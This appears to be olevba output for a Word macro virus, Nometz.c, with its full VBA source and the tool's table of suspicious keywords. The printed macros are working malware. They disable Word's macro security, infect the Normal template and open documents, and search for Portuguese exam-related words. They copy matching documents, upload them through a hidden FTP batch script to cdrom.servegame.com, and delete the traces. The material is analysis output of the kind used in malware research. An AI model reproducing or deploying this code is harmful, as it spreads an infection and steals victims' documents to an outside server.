olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nometz.c-9859f4a3753559ef46e6895154300a9445513f11
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nometz.c-9859f4a3753559ef46e6895154300a9445513f11 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cdrom.bas 
in file: Virus.MSWord.Nometz.c-9859f4a3753559ef46e6895154300a9445513f11 - OLE stream: 'Macros/VBA/cdrom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
Dim x
On Error Resume Next
ChangeFileOpenDirectory "C:\Meus documentos\"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "DontTrustInstalledFiles") = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1
nor = False
doc = False
nm = "cdrom"
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
ActiveDocument.ReadOnlyRecommended = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
CommandBars("tools").Controls("Macro").Visible = False
ShowVisualBasicEditor = False
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
If ActiveDocument.VBProject.VBComponents.Count > 0 Then
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents.Item(i).Name = nm Then doc = True
 Next
End If

 For Each VbComponent In NormalTemplate.VBProject.VBComponents

      If VbComponent.Name = nm Then nor = True

  Next
  
If nor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
End If
 If Dir(sv + c1 + nm + ".dot") = "" Then
    cx = ActiveDocument.Path
    c2 = ActiveDocument.FullName
    ActiveDocument.SaveAs sv + c1 + nm, AddToRecentFiles:=False, FileFormat:=wdFormatTemplate
    Documents.Open FileName:=c2
    Documents(c2).Activate
             For i = 1 To RecentFiles.Count
         If i < RecentFiles.Count + 1 Then
          If Right(RecentFiles(i).Name, 3) = "dot" Then
          nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + RecentFiles(i).Name + ".lnk"
             If Dir(nome) <> "" Then Kill nome
          RecentFiles(i).Delete
          End If
         End If
         Next
    Documents(sv + c1 + nm + ".dot").Close
 End If

If doc = False Then
Application.OrganizerCopy Source:=(sv + c1 + nm + ".dot"), Destination:=ActiveDocument.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
End If

mySearchString = "Pr" + Chr(111) + Chr(118) + Chr(97)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
If x < 6 Then
  mySearchString = Chr(97) + "v" + Chr(97) + "li" + Chr(97) + "çã" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
  mySearchString = "c" + Chr(111) + "p" + Chr(101) + "v" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
mySearchString = "c" + Chr(111) + "ncu" + Chr(114) + "s" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "xc" + Chr(101) + "t" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "x" + Chr(97) + "m" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
    Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext, Name:="1"
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = ""
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
 sn = Left(ActiveDocument.Name, Len(ActiveDocument.Name) - 3) + "j" + Chr(112) + "g"
 s2 = ActiveDocument.Name
 If x = 6 And ActiveDocument.Saved And Dir(sv + c1 + sn) = "" Then
    cx = ActiveDocument.Path
    c2 = ActiveDocument.FullName
    ActiveDocument.SaveAs sv + c1 + sn, AddToRecentFiles = False
    Documents.Open FileName:=c2
    Documents(c2).Activate
    Documents(sv + c1 + sn).Close
    nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + s2 + ".lnk"
    If Dir(nome) <> "" Then Kill nome
     End If
         For i = 1 To RecentFiles.Count
         If i < RecentFiles.Count + 1 Then
       If Right(RecentFiles(i).Name, 3) = "j" + Chr(112) + "g" Then
        nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + RecentFiles(i).Name + ".lnk"
       RecentFiles(i).Delete
     If Dir(nome) <> "" Then Kill nome
       End If
       End If
    Next

End Sub
Sub autoclose()
On Error Resume Next
         For i = 1 To RecentFiles.Count
         If i < RecentFiles.Count + 1 Then
       If Right(RecentFiles(i).Name, 3) = "j" + Chr(112) + "g" Or Right(RecentFiles(i).Name, 3) = "dot" Then
       nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + RecentFiles(i).Name + ".lnk"
       RecentFiles(i).Delete
       If Dir(nome) <> "" Then Kill nome
       End If
       End If
    Next

End Sub
Sub autoexit()
On Error Resume Next
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
sn = sv + c1 + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)

s1 = sv + c1 + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)

 If Dir(sv + c1 + Chr(42) + ".j" + Chr(112) + "g") <> "" Then
        Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r n" + Chr(111) + "vat" + Chr(111) + "  " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, Chr(112) + "ut " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
    
         Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -n -s:" + s1
    Print #1, Chr(103 - 3) + "el " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "del " + s1
    Print #1, "del " + sn
    Close #1
        Shell sn, vbHide
        
End If
       nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + "cdrom" + ".dot" + ".lnk"
       If Dir(nome) <> "" Then Kill nome
       nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + "*jpg.lnk"
       Do While Dir("c:\windows\recent\*jpg.lnk") <> ""
        ffile = Dir(nome)
        vv1 = "c:\windows\recent\" + ffile
        Kill vv1

        Loop
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |jpg.lnk             |Executable file name                         |
+----------+--------------------+---------------------------------------------+
